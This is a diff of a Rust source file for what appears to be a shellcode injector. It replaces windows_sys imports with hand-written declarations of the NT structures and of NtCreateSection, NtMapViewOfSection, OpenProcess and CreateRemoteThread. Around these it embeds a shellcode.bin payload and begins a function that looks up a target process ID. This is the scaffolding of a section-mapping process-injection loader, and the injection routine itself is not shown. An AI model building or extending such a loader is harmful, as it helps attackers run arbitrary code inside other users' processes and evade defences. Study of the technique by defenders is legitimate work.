@@ -1,30 +1,116 @@
 #![allow(deprecated)]
 #![allow(non_camel_case_types)]
 #![allow(non_upper_case_globals)]
-use std::{intrinsics::copy_nonoverlapping, mem::transmute, os::raw::c_void, ptr::null_mut};
-
-use windows_sys::{
-    Wdk::{
-        Storage::FileSystem::NtCreateSection,
-        System::{
-            Memory::{NtMapViewOfSection, NtUnmapViewOfSection},
-            SystemInformation::{NtQuerySystemInformation, SystemProcessInformation},
-        },
-    },
-    Win32::{
-        Foundation::{CloseHandle, STATUS_INFO_LENGTH_MISMATCH},
-        System::{
-            Threading::{
-                CreateRemoteThread, GetCurrentProcess, OpenProcess, PROCESS_QUERY_INFORMATION,
-                PROCESS_VM_OPERATION, PROCESS_VM_READ, PROCESS_VM_WRITE, WaitForSingleObject,
-            },
-            WindowsProgramming::SYSTEM_PROCESS_INFORMATION,
-        },
-    },
+#![allow(non_snake_case)]
+use std::{
+    intrinsics::copy_nonoverlapping,
+    mem::transmute,
+    os::{raw::c_void, windows::raw::HANDLE},
+    ptr::null_mut,
 };
+
+#[repr(C)]
+#[derive(Clone, Copy)]
+pub struct SYSTEM_PROCESS_INFORMATION {
+    pub NextEntryOffset: u32,
+    pub NumberOfThreads: u32,
+    pub Reserved1: [u8; 48],
+    pub ImageName: UNICODE_STRING,
+    pub BasePriority: i32,
+    pub UniqueProcessId: HANDLE,
+    pub Reserved2: *mut core::ffi::c_void,
+    pub HandleCount: u32,
+    pub SessionId: u32,
+    pub Reserved3: *mut core::ffi::c_void,
+    pub PeakVirtualSize: usize,
+    pub VirtualSize: usize,
+    pub Reserved4: u32,
+    pub PeakWorkingSetSize: usize,
+    pub WorkingSetSize: usize,
+    pub Reserved5: *mut core::ffi::c_void,
+    pub QuotaPagedPoolUsage: usize,
+    pub Reserved6: *mut core::ffi::c_void,
+    pub QuotaNonPagedPoolUsage: usize,
+    pub PagefileUsage: usize,
+    pub PeakPagefileUsage: usize,
+    pub PrivatePageCount: usize,
+    pub Reserved7: [i64; 6],
+}
+
+#[repr(C)]
+#[derive(Clone, Copy, Default)]
+pub struct SECURITY_QUALITY_OF_SERVICE {
+    pub Length: u32,
+    pub ImpersonationLevel: SECURITY_IMPERSONATION_LEVEL,
+    pub ContextTrackingMode: u8,
+    pub EffectiveOnly: bool,
+}
+
+#[repr(C)]
+#[derive(Clone, Copy)]
+pub struct OBJECT_ATTRIBUTES {
+    pub Length: u32,
+    pub RootDirectory: HANDLE,
+    pub ObjectName: *const UNICODE_STRING,
+    pub Attributes: OBJECT_ATTRIBUTE_FLAGS,
+    pub SecurityDescriptor: *const SECURITY_DESCRIPTOR,
+    pub SecurityQualityOfService: *const SECURITY_QUALITY_OF_SERVICE,
+}
+
+#[repr(C)]
+#[derive(Clone, Copy)]
+pub struct UNICODE_STRING {
+    pub Length: u16,
+    pub MaximumLength: u16,
+    pub Buffer: windows_sys::core::PWSTR,
+}
+
+#[repr(C)]
+#[derive(Clone, Copy)]
+pub struct SECURITY_DESCRIPTOR {
+    pub Revision: u8,
+    pub Sbz1: u8,
+    pub Control: SECURITY_DESCRIPTOR_CONTROL,
+    pub Owner: PSID,
+    pub Group: PSID,
+    pub Sacl: *mut ACL,
+    pub Dacl: *mut ACL,
+}
+
+#[repr(C)]
+#[derive(Clone, Copy, Default)]
+pub struct ACL {
+    pub AclRevision: u8,
+    pub Sbz1: u8,
+    pub AclSize: u16,
+    pub AceCount: u16,
+    pub Sbz2: u16,
+}
+
+pub type SECURITY_DESCRIPTOR_CONTROL = u16;
+#[repr(C)]
+#[derive(Clone, Copy, Default)]
+pub struct SECURITY_DESCRIPTOR_RELATIVE {
+    pub Revision: u8,
+    pub Sbz1: u8,
+    pub Control: SECURITY_DESCRIPTOR_CONTROL,
+    pub Owner: u32,
+    pub Group: u32,
+    pub Sacl: u32,
+    pub Dacl: u32,
+}
+
+#[repr(C)]
+#[derive(Clone, Copy)]
+pub struct SECURITY_ATTRIBUTES {
+    pub nLength: u32,
+    pub lpSecurityDescriptor: *mut core::ffi::c_void,
+    pub bInheritHandle: windows_sys::core::BOOL,
+}
 
 const SHELLCODE: &[u8] = include_bytes!("../shellcode.bin");
 
+pub type BOOL = i32;
 pub type SECTION_INHERIT = i32;
 pub const ViewShare: SECTION_INHERIT = 1i32;
 pub type PAGE_PROTECTION_FLAGS = u32;
@@ -34,6 +120,84 @@ pub const PAGE_READWRITE: PAGE_PROTECTION_FLAGS = 4u32;
 pub const SEC_COMMIT: PAGE_PROTECTION_FLAGS = 134217728u32;
 pub type SECTION_FLAGS = u32;
 pub const SECTION_ALL_ACCESS: SECTION_FLAGS = 983071u32;
+
+pub type SYSTEM_INFORMATION_CLASS = i32;
+pub const SystemProcessInformation: SYSTEM_INFORMATION_CLASS = 5i32;
+pub type NTSTATUS = i32;
+
+pub const STATUS_INFO_LENGTH_MISMATCH: NTSTATUS = 0xC0000004_u32 as _;
+
+pub type WAIT_EVENT = u32;
+pub type PROCESS_ACCESS_RIGHTS = u32;
+pub type LPTHREAD_START_ROUTINE =
+    Option<unsafe extern "system" fn(lpthreadparameter: *mut core::ffi::c_void) -> u32>;
+
+pub const PROCESS_QUERY_INFORMATION: PROCESS_ACCESS_RIGHTS = 1024u32;
+pub const PROCESS_VM_OPERATION: PROCESS_ACCESS_RIGHTS = 8u32;
+pub const PROCESS_VM_READ: PROCESS_ACCESS_RIGHTS = 16u32;
+pub const PROCESS_VM_WRITE: PROCESS_ACCESS_RIGHTS = 32u32;
+pub type OBJECT_ATTRIBUTE_FLAGS = u32;
+pub type SECURITY_IMPERSONATION_LEVEL = i32;
+pub type PSID = *mut core::ffi::c_void;
+
+#[link(name = "ntdll")]
+unsafe extern "system" {
+    fn NtQuerySystemInformation(
+        systeminformationclass: SYSTEM_INFORMATION_CLASS,
+        systeminformation: *mut core::ffi::c_void,
+        systeminformationlength: u32,
+        returnlength: *mut u32,
+    ) -> NTSTATUS;
+    fn NtCreateSection(
+        sectionhandle: *mut HANDLE,
+        desiredaccess: u32,
+        objectattributes: *const OBJECT_ATTRIBUTES,
+        maximumsize: *const i64,
+        sectionpageprotection: u32,
+        allocationattributes: u32,
+        filehandle: HANDLE,
+    ) -> NTSTATUS;
+    fn NtMapViewOfSection(
+        sectionhandle: HANDLE,
+        processhandle: HANDLE,
+        baseaddress: *mut *mut core::ffi::c_void,
+        zerobits: usize,
+        commitsize: usize,
+        sectionoffset: *mut i64,
+        viewsize: *mut usize,
+        inheritdisposition: SECTION_INHERIT,
+        allocationtype: u32,
+        win32protect: u32,
+    ) -> NTSTATUS;
+    fn NtUnmapViewOfSection(
+        processhandle: HANDLE,
+        baseaddress: *const core::ffi::c_void,
+    ) -> NTSTATUS;
+}
+
+#[link(name = "kernel32")]
+unsafe extern "system" {
+    fn CreateRemoteThread(
+        hprocess: HANDLE,
+        lpthreadattributes: *const SECURITY_ATTRIBUTES,
+        dwstacksize: usize,
+        lpstartaddress: LPTHREAD_START_ROUTINE,
+        lpparameter: *const core::ffi::c_void,
+        dwcreationflags: u32,
+        lpthreadid: *mut u32,
+    ) -> HANDLE;
+    fn GetCurrentProcess() -> HANDLE;
+
+    fn CloseHandle(hobject: HANDLE) -> BOOL;
+
+    fn OpenProcess(
+        dwdesiredaccess: PROCESS_ACCESS_RIGHTS,
+        binherithandle: windows_sys::core::BOOL,
+        dwprocessid: u32,
+    ) -> HANDLE;
+
+    fn WaitForSingleObject(hhandle: HANDLE, dwmilliseconds: u32) -> WAIT_EVENT;
+}
 
 fn get_pid(process_name: &str) -> u32 {
     let mut pid = 0;
